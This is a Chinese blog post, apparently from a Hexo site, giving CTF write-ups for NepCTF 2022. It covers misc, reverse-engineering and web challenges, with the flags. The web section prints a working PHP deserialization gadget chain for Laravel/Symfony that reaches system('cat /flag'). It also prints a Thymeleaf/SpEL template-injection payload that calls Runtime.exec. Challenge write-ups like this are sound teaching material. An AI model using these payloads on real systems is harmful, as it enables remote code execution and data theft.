@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hudielan.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fhudielan.png">
+  <link rel="mask-icon" href="/images/hudielan.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入密码') !== ''){
+                alert('密码错误');
+                history.back();
+            }
+        }
+    })();
+</script>
+  <meta name="description" content="NepCTF 2022">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF 2022">
+<meta property="og:url" content="http://example.com/2022/09/07/NepCTF/index.html">
+<meta property="og:site_name" content="影影之家">
+<meta property="og:description" content="NepCTF 2022">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151849807.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151850888.jpg?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151852447.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151853959.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151854403.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152151343.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152248043.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207162114733.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152201977.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152338523.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152338293.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152340140.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207160057751.png?x-oss-process=hzy">
+<meta property="og:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152349502.png?x-oss-process=hzy">
+<meta property="article:published_time" content="2022-09-07T11:26:53.000Z">
+<meta property="article:modified_time" content="2022-10-31T04:49:35.048Z">
+<meta property="article:author" content="余归">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151849807.png?x-oss-process=hzy">
+
+<link rel="canonical" href="http://example.com/2022/09/07/NepCTF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>NepCTF 2022 | 影影之家</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">影影之家</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-love">
+
+    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/07/NepCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="余归">
+      <meta itemprop="description" content="Believe not all that you see nor half what you hear.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="影影之家">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          NepCTF 2022
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-09-07 19:26:53" itemprop="dateCreated datePublished" datetime="2022-09-07T19:26:53+08:00">2022-09-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-31 12:49:35" itemprop="dateModified" datetime="2022-10-31T12:49:35+08:00">2022-10-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/09/07/NepCTF/" class="post-meta-item leancloud_visitors" data-flag-title="NepCTF 2022" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/09/07/NepCTF/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/09/07/NepCTF/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>NepCTF 2022</p>
+<span id="more"></span>
+
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="花花画画画花花"><a href="#花花画画画花花" class="headerlink" title="花花画画画花花"></a>花花画画画花花</h2><blockquote>
+<p>花花画了一张图，你能看出来她画的是什么吗</p>
+</blockquote>
+<p>下载附件发现是.osz文件，是 <code>osu!</code> 的一个谱面压缩文件，下载osu!软件然后附件拖进去</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151849807.png?x-oss-process=hzy" alt="image-20220715184927423"></p>
+<p>启动osu!，进入到edit模式，一点一点放，这里放个图吧</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151850888.jpg?x-oss-process=hzy" alt="img"></p>
+<p>最后拼接一下就是flag</p>
+<p>NepCTF{MASTER_OF_坏女人！}</p>
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><blockquote>
+<p>极限套娃</p>
+</blockquote>
+<p>附件就是套娃，刚开始出的那个套一半就卡住了，后来主办方降低难度了，新的附件有思路，就是简单的套娃</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151852447.png?x-oss-process=hzy" alt="image-20220715185253401"></p>
+<p>解压脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">zipname = &quot;C:\\Users\\25963\\Desktop\\新\\xxx\\232\\231\\&quot;+&quot;230.zip&quot;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    if zipname[len(zipname)-4:] == &quot;.zip&quot;:</span><br><span class="line">        pzip = zipfile.ZipFile(zipname)</span><br><span class="line">        res = re.search(&#x27;[0-9]*&#x27;,pzip.namelist()[0])</span><br><span class="line">        print(res.group())</span><br><span class="line">        password = res.group()</span><br><span class="line">        password = password.encode(&#x27;ascii&#x27;)</span><br><span class="line">        pzip.extractall(&quot;D:\\developer\\python_shell\\zip&quot;,pwd=password)</span><br><span class="line">        zipname = &quot;D:\\developer\\python_shell\\zip\\&quot;+pzip.namelist()[0]</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;end&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151853959.png?x-oss-process=hzy" alt="image-20220715185354913"></p>
+<p>发现是伪加密，直接用winrar修复</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207151854403.png?x-oss-process=hzy" alt="image-20220715185440337"></p>
+<p>流量分析发现是usb流量</p>
+<h2 id="9点直播"><a href="#9点直播" class="headerlink" title="9点直播"></a>9点直播</h2><p>老老实实看直播，听出题人说有多么简单，然后拿到flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152151343.png?x-oss-process=hzy" alt="image-20220715215119009"></p>
+<p>NepCTF{bad_woman_nb!}</p>
+<h2 id="少见的bbbbase"><a href="#少见的bbbbase" class="headerlink" title="少见的bbbbase"></a>少见的bbbbase</h2><p>附件是个jpg，用Jphswin，无密码，直接导出base加密的flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152248043.png?x-oss-process=hzy" alt="image-20220715224825979"></p>
+<p>base58解码得到明文flag</p>
+<p>flag{Real_qiandao~}</p>
+<h2 id="馅饼？陷阱！"><a href="#馅饼？陷阱！" class="headerlink" title="馅饼？陷阱！"></a>馅饼？陷阱！</h2><p>结合东北饺子城，百度地图搜索得到对面就是那个银行</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207162114733.png?x-oss-process=hzy" alt="image-20220716211423856"></p>
+<p>银行是光大银行</p>
+<p>NepCTF{<a target="_blank" rel="noopener" href="http://www.cebbank.com}/">www.cebbank.com}</a></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="快来签到"><a href="#快来签到" class="headerlink" title="快来签到"></a>快来签到</h2><p>下载附件，ida32，打开之后修改最大节点数为9999，得到flag</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152201977.png?x-oss-process=hzy" alt="image-20220715220158915"></p>
+<p>NepCTF{welc0me_t0_nepctf}</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Just-Kidding"><a href="#Just-Kidding" class="headerlink" title="Just Kidding"></a>Just Kidding</h2><p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152338523.png?x-oss-process=hzy" alt="image-20220715233829454"></p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152338293.png?x-oss-process=hzy" alt="image-20220715233815201"></p>
+<p>反序列化漏洞，poc如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Faker &#123;</span><br><span class="line">    class Generator &#123;</span><br><span class="line">        protected $providers = [];</span><br><span class="line">        protected $formatters = [];</span><br><span class="line">        function __construct() &#123;</span><br><span class="line">            $this-&gt;formatter = &quot;dispatch&quot;;</span><br><span class="line">            $this-&gt;formatters = 9999;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Broadcasting &#123;</span><br><span class="line">    class PendingBroadcast &#123;</span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this-&gt;event = &quot;cat /flag&quot;;</span><br><span class="line">            $this-&gt;events = new \Faker\Generator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Mime\Part &#123;</span><br><span class="line">    abstract class AbstractPart &#123;</span><br><span class="line">        private $headers = null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class SMimePart extends AbstractPart &#123;</span><br><span class="line">        protected $_headers;</span><br><span class="line">        public $h3rmesk1t;</span><br><span class="line">        function __construct() &#123;</span><br><span class="line">            $this-&gt;_headers = [&quot;dispatch&quot;=&gt;&quot;system&quot;];</span><br><span class="line">            $this-&gt;h3rmesk1t = new \Illuminate\Broadcasting\PendingBroadcast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $pop = new \Symfony\Component\Mime\Part\SMimePart();</span><br><span class="line">    $ser = preg_replace(&quot;/([^\&#123;]*\&#123;)(.*)(s:49.*)(\&#125;)/&quot;,&quot;\\1\\3\\2\\4&quot;,serialize($pop));</span><br><span class="line">    echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152340140.png?x-oss-process=hzy" alt="image-20220715234022070"></p>
+<p>NepCTF{e3edfaa0-e66e-4c7b-8c0b-e1cde5c7c40a}</p>
+<h2 id="Challenger"><a href="#Challenger" class="headerlink" title="Challenger"></a>Challenger</h2><p>下附件，分析路由</p>
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207160057751.png?x-oss-process=hzy" alt="image-20220716005743688"></p>
+<p>payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval?lang=__$%7Bnew java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;cat /flag&quot;).getInputStream()).next()%7D__::.x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207152349502.png?x-oss-process=hzy" alt="image-20220715234918429"></p>
+<p>/NepCTF{b2d6a9bf-4f90-4abc-b5ae-9c07c4439ca5}</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>余归
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/09/07/NepCTF/" title="NepCTF 2022">http://example.com/2022/09/07/NepCTF/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/07/17/ImaginaryCTF-2022/" rel="prev" title="ImaginaryCTF-2022">
+      <i class="fa fa-chevron-left"></i> ImaginaryCTF-2022
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/10/31/moectf/" rel="next" title="moectf">
+      moectf <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">1.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8A%B1%E8%8A%B1%E7%94%BB%E7%94%BB%E7%94%BB%E8%8A%B1%E8%8A%B1"><span class="nav-number">1.1.</span> <span class="nav-text">花花画画画花花</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9%E7%82%B9%E7%9B%B4%E6%92%AD"><span class="nav-number">1.3.</span> <span class="nav-text">9点直播</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%91%E8%A7%81%E7%9A%84bbbbase"><span class="nav-number">1.4.</span> <span class="nav-text">少见的bbbbase</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A6%85%E9%A5%BC%EF%BC%9F%E9%99%B7%E9%98%B1%EF%BC%81"><span class="nav-number">1.5.</span> <span class="nav-text">馅饼？陷阱！</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#re"><span class="nav-number">2.</span> <span class="nav-text">re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%AB%E6%9D%A5%E7%AD%BE%E5%88%B0"><span class="nav-number">2.1.</span> <span class="nav-text">快来签到</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">3.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Just-Kidding"><span class="nav-number">3.1.</span> <span class="nav-text">Just Kidding</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Challenger"><span class="nav-number">3.2.</span> <span class="nav-text">Challenger</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="余归"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">余归</p>
+  <div class="site-description" itemprop="description">Believe not all that you see nor half what you hear.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+
+
+
+      
+<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+<div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div id="myCanvasContainer" class="widget tagcloud">
+        <canvas width="250" height="250" id="resCanvas" style="width=100%">
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp-CTF/" rel="tag">-wp -CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">31</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag">php伪协议</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tips/" rel="tag">tips</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a><span class="tag-list-count">22</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E5%BE%97/" rel="tag">心得</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91/" rel="tag">逆向</a><span class="tag-list-count">1</span></li></ul>
+        </canvas>
+    </div>
+</div>
+
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备2022025057号-1 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=%E8%B1%AB%E5%85%AC%E7%BD%91%E5%AE%89%E5%A4%87%2041142602000196%E5%8F%B7" rel="noopener" target="_blank">豫公网安备 41142602000196号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; Sun Dec 26 2021 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">余归</span>
+</div>
+  <div class="powered-by">
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("12/25/2021 17:38:00");
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "影影已在此快乐的玩耍了 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+<br />
+
+
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">影影的家共种了45.3k朵花</span>
+</div>
+
+<br />
